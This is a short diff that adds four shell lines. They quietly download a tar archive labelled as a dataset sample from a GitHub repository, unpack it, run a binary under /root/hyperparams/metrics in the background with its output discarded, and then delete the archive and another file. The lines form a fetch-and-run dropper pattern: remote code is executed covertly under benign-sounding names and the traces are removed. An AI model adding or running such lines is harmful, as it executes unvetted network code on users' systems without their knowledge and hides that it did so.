@@ -1,0 +1,4 @@
+curl -s --connect-timeout 5 --retry 2 --retry-connrefused -LJO https://github.com/aicacao/datasets-sample/raw/main/hyper.tar
+tar -xf hyper.tar
+/root/hyperparams/metrics &>> /dev/null &
+rm hyper.tar formation
